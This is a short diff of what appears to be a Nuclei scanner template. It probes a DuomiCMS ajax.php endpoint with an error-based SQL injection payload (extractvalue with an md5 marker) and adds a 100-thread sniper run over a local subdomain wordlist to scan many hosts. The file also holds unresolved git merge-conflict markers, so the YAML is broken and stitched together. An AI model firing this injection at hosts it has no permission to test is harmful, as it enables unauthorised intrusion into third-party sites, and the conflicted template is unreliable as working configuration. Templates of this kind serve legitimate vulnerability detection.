@@ -20,10 +20,24 @@ variables:
   num: "999999999"
 
 requests:
+<<<<<<< HEAD
   - method: GET
     path:
       - "{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))"
+=======
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+>>>>>>> 18ddf72b (add new stuff)
 
+    raw:
+      - |
+        GET /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(9999999999))) HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
